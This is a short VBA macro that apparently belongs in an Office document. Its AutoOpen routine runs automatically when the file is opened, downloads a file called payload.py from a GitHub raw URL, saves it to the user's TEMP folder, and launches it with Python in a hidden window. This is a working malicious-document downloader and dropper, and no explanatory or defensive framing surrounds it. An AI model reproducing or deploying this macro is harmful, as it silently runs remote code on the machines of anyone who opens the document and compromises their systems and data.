Sub AutoOpen()
    Dim http As Object
    Dim url As String
    Dim tempPath As String
    Dim filePath As String
    Dim stream As Object
    Dim shell As Object

    url = "https://raw.githubusercontent.com/wowjulian/assignment3/refs/heads/main/payload.py"

    tempPath = Environ("TEMP")
    filePath = tempPath & "\payload.py"
    Set http = CreateObject("MSXML2.XMLHTTP")
    http.Open "GET", url, False
    http.Send

    If http.Status = 200 Then
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 2
        stream.Charset = "utf-8"
        stream.Open
        stream.WriteText http.ResponseText
        stream.SaveToFile filePath, 2
        stream.Close

        Set shell = CreateObject("WScript.Shell")
        shell.Run "python """ & filePath & """", 0, False
    Else
        MsgBox "Failed to run the script. Status: " & http.Status
    End If
End Sub